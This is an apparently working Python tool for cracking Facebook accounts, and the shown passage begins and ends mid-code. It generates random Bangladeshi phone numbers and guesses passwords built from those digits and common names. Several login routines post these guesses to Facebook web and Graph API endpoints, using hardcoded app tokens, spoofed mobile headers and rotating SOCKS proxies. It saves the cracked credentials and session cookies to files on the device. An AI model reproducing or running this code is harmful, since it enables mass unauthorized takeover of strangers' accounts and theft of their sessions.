                  gmail.submit(randome,idf,pwv,tl)
    print("")
    linex()
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m THE PROCESS HAS BEEN COMPLETED...')
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m TOTAL OK/CP : {str(len(oks))}/{str(len(cps))}')
    linex()
    input(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m PRESS ENTER TO EXIT ")
    exit()
#------------------(NUMBER)--------------------#
def number():
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : 01609, 01326")
    linex()
    code = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m ENTER SIM : ")
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : 2000 4000 7000 10000 ")
    linex()
    try:
       limit = int(input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m ENTER LIMIT : "))
    except:
       limit = 5000
    user=[]
    for xcxd in range(limit):
       nmp = ''.join(random.choice(string.digits) for _ in range(6))
       user.append(nmp)
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m CREAK WITH 4 PASSWORD")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m CREAK WITH 6 PASSWORD")
    print("\x1b[38;5;160m[\x1b[1;32m3\x1b[38;5;160m]\x1b[38;5;46m CREAK WITH 10 PASSWORD")
    print("\x1b[38;5;160m[\x1b[1;32m4\x1b[38;5;160m]\x1b[38;5;46m CREAK WITH 20+ PASSWORD")
    linex()
    nnjjhh = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m SELECT : ")
    if nnjjhh in ['01','1']:mpdx="M1"
    elif nnjjhh in ['02','2']:mpdx="M2"
    elif nnjjhh in ['03','3']:mpdx="M3"
    elif nnjjhh in ['04','4']:mpdx="M4"
    else:mpdx="M3"
    clear()
    print("\x1b[38;5;160m[\x1b[1;32m1\x1b[38;5;160m]\x1b[38;5;46m Method A b-graph (testing)")
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Method B skip-api (working)")
    linex()
    nnjjkhh = input("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m SELECT : ")
    if nnjjkhh in ["a","A","01","1"]:mhhtd="M1"
    elif nnjjkhh in ["B","b","02","2"]:mhhtd="M2"
    else:mhhtd="M2"
    with tred(max_workers=60) as soon:
       clear()
       tl = str(len(user))
       sorfy = time.strftime("%H:%M")
       ghonta,minitx=sorfy.split(':')
       ghonta=ghonta.replace('00','12')
       real_time=str(ghonta)+":"+str(minitx)+" "+str(tag)
       print(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m SIM CODE : {code} \x1b[38;5;202m>\x1b[38;5;46m {tl} \x1b[1;31m|\x1b[38;5;46m {real_time}")
       print("\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m USE FAKE APN OR \x1b[38;5;160m[\x1b[38;5;228mON\x1b[0m/\x1b[38;5;202mOFF\x1b[38;5;160m]\x1b[38;5;46m AIR MODE ")
       linex()
       for psx in user:
          idf = code+psx
          #pwv = ['57273200','59039200','57575751','57575752']
          pwv = [idf[:6],psx]
          #pwv = [psx,idf[:6],idf[:7],idf[:8],idf[4:],idf[5:],idf,idf[3:11],'203040','506070','708090','sadiya','i love you','tabassum','112233','223344','445566','667788','778899','009988','00998877','123357']
          """elif "M2" in mpdx:
               pwv = [psx,idf[:8],idf[:7],idf[:6],idf[5:],'203040','i love you']
          elif "M3" in mpdx:
               pwv = [psx,idf[:6],idf[:7],idf[:8],idf[4:],idf[5:],idf,idf[3:11],'203040','506070','708090']
          elif "M4" in mpdx:
               pwv = [psx,idf[:8],idf[:7],idf[:6],idf[5:],idf[3:],idf[4:],idf[2:],idf,'i love you','iloveyou','bangladesh','@@@###','203040','jannat','sadiya','nadiya','trisha','mimmim','fflover','kamrul','sabbir','223344','sumaiya','@@##@@','fariya','113355','tabassum','nusrat','asdfghjkl','ayesha','siam12','saidul','nazmul','112200','121234','506070','708090','asraful','sarmin','mababa','aaabbb','free fire']
          else:
               pwv = [psx,idf[:6],idf[:7],idf[:8],idf[4:],idf[5:],idf,idf[3:11],'203040','506070','708090']"""
          if "M1" in mhhtd:
              soon.submit(tuki,idf,pwv,tl)
          elif "M2" in mhhtd:
              soon.submit(randome,idf,pwv,tl)
          else:
             exit()
    print("")
    linex()
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m THE PROCESS HAS BEEN COMPLETED...')
    print(f'\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m TOTAL OK/CP : {str(len(oks))}/{str(len(cps))}')
    linex()
    input(f"\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m PRESS ENTER TO EXIT ")
    exit()
#--------------------(NOOB-M1)-----------------#
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-M1\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            url_1 = f"https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr"
            po_1 = ses.get(url_1)
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(po_1.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(po_1.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in po_1.cookies.get_dict().items() ])
            koki+='; m_pixel_ratio=2.625; wd=412x756'
            head_2 = {"Host": "m.facebook.com","Connection": "keep-alive","Content-Length": "332","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://h.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": 'https://m.facebook.com/login',"Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-US;q=0.6"}
            po = ses.post('https://web.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=head_2,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                #print(f'\r\x1b[38;5;166m[NOOB-CP] {idf} | {pw}')
                open('/sdcard/NOOB/NOOB-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                kuki=kuki.replace("ps_l=0;ps_n=0;",'')
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥] Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/NOOB-M1-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/NOOB-M1-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#------------------(NOOB-M2)-------------------#
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-M2\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Log In"}
            heade = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': mx_ua()}
            po = ses.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[38;5;166m[NOOB-CP] {idf} | {pw}')
                open('/sdcard/NOOB/NOOB-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                kuki=kuki.replace("ps_l=0;ps_n=0;",'')
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/NOOB-M2-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/NOOB-M2-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop+=1
#---------------------(NOOB-M3)---------------------------#
def creakup(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-M3\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    mx_ua = f"[FBAN/FB4A;FBAV/450.0.0.42.110;FBBV/449017334;"+"FBDM/{density=2.279,width=1080,height=1920};FBLC/en_US;FBRV/385541350;FBCR/hotlink;FBMF/nexus;FBBD/nexus;FBPN/com.facebook.katana;FBDV/N939Sc;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]"
    hini = str(random.randint(20000, 40000))
    for pw in pwv:
        try:
            with requests.Session() as session:
               dataa = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login','email': idf,'password': pw,'access_token': '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','generate_session_cookies': '1','meta_inf_fbmeta': '','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
               heade = {'User-Agent': mx_ua,'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': hini,'X-FB-SIM-HNI': hini,'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            po = session.post('https://api.facebook.com/auth/login',data=dataa,headers=heade,allow_redirects=False,verify=True).json()
            if "session_key" in po:
                ok+=1
                kuki = ";".join(xr["name"]+"="+xr["value"] for xr in po["session_cookies"])
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/NOOB-M3-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/NOOB-M3-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\x1b[38;5;166m[NOOB-CP] {idf} | {pw}')
                open('/sdcard/NOOB/NOOB-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#---------------------(NOOB-M4)---------------------------#
def creakbst(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-M4\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    hini = str(random.randint(20000, 40000))
    usa = random.choice(ugen)
    for pw in pwv:
        nip=random.choice(prox)
        proxs={'http': 'socks4://'+nip}
        try:
            with requests.Session() as session:
               headers = {'User-Agent': useragenttx(),'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Host': 'graph.facebook.com','Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af','X-FB-Net-HNI': hini,'X-FB-SIM-HNI': hini,'X-FB-Client-IP': 'True','X-FB-Request-Analytics-Tags': 'graphservice','X-Tigon-Is-Retry': 'False','X-FB-HTTP-Engine': 'Liger','X-FB-Connection-Quality': 'EXCELLENT','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','X-FB-Connection-Bandwidth': '80025933','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Connection-Type': 'MOBILE.LTE','Content-Type': 'application/x-www-form-urlencoded'}
               params = {'include_headers': 'false','decode_body_json': 'false','streamable_json_response': 'true'}
               data = {'adid': str(uuid.uuid4()),'device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'advertiser_id': str(uuid.uuid4()),'format': 'json','cpl': 'true','credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'register_api','email': idf,'password': pw,'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af','generate_session_cookies': '1','meta_inf_fbmeta': 'NO_FILE','currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d','sig': 'cc331688c9ec07059af4df9dbdcf7737'}
            po = requests.post('https://b-graph.facebook.com/auth/login', params=params,proxies=proxs, headers=headers, data=data).json()
            print(po)
            if "session_key" in po:
                ok+=1
                kuki = ";".join(xr["name"]+"="+xr["value"] for xr in po["session_cookies"])
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/NOOB-M4-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/NOOB-M4-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\x1b[38;5;166m[NOOB-CP] {idf} | {pw}')
                open('/sdcard/NOOB/NOOB-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#---------------------(NOOB-M5)---------------------------#
def creaksexy(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-M5\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({
    'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"RMX{str(random.randrange(2000,4000))}"',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': f'"{str(random.randrange(7,14))}.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'upgrade-insecure-requests': '1',
    'user-agent': mx_ua(),
    'viewport-width': '980'})
            p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1710010928719%26e2e%3D%257B%2522init%2522%253A1710010928719%257D%26ies%3D0%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D7823cbed-adb3-41d1-85ba-49471f5ffc3b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522399ce1f6-6ff4-4243-9b71-34e0a8ee712c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522pf60kpbkoeflp971v2ci%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DPn-BO7nTXIrXSs2JTcwzPzz9b59hTS88BDmHpsedz-U%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D399ce1f6-6ff4-4243-9b71-34e0a8ee712c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522399ce1f6-6ff4-4243-9b71-34e0a8ee712c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522pf60kpbkoeflp971v2ci%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1), 'encpass':'#PWD_BROWSER:0:%s:%s'%(re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),pw), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=';m_pixel_ratio=2.625;wd=412x756'
            heade = {
    'authority': 'm.facebook.com',
    'Connection': 'keep-alive',
    'Content-Length': str(len(dataa)),
    'X-FB-LSD': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
    'X-Requested-With': 'XMLHttpRequest',
    'X-ASBD-ID': '129477',
    'User-Agent': mx_ua(),
    'X-Response-Format': 'JSONStream',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://m.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1710010928719%26e2e%3D%257B%2522init%2522%253A1710010928719%257D%26ies%3D0%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D7823cbed-adb3-41d1-85ba-49471f5ffc3b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522399ce1f6-6ff4-4243-9b71-34e0a8ee712c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522pf60kpbkoeflp971v2ci%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DPn-BO7nTXIrXSs2JTcwzPzz9b59hTS88BDmHpsedz-U%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D399ce1f6-6ff4-4243-9b71-34e0a8ee712c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522399ce1f6-6ff4-4243-9b71-34e0a8ee712c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522pf60kpbkoeflp971v2ci%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
    'Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2'}
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,proxies=proxs,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                #print(f'\r\x1b[38;5;166m[NOOB-CP] {idf} | {pw}')
                open('/sdcard/NOOB/NOOB-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                kuki=kuki.replace("ps_l=0;ps_n=0;",'')
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/NOOB-M5-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/NOOB-M5-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#----------------------(NOOB-RND)-----------------#
oks,cps=[],[]
def randome(idf,pwv,tl):
    global loop,oks,cps,proxy
    bo = random.choice([m,k,h,b,u,x])
    ua = random.choice(ugen)
    ua2 = random.choice(ugen3)
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-R1\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{tl}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{str(len(oks))}\x1b[38;5;160m]");sys.stdout.flush()
    try:
        for pw in pwv:
            ses = requests.Session()
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1710147412721%26e2e%3D%257B%2522init%2522%253A1710147412721%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D66fc702d-7de8-46d7-a3bf-4341a6aa8fa5%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b4a846c7-9b30-407f-b787-d15d46f32127%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lrpl1di4hbqs6cnegooq%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DV7J-hbTed8b8T5lCneKIYaVcyAH_gIDO7zweaYGkKTc%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db4a846c7-9b30-407f-b787-d15d46f32127%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522b4a846c7-9b30-407f-b787-d15d46f32127%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%2522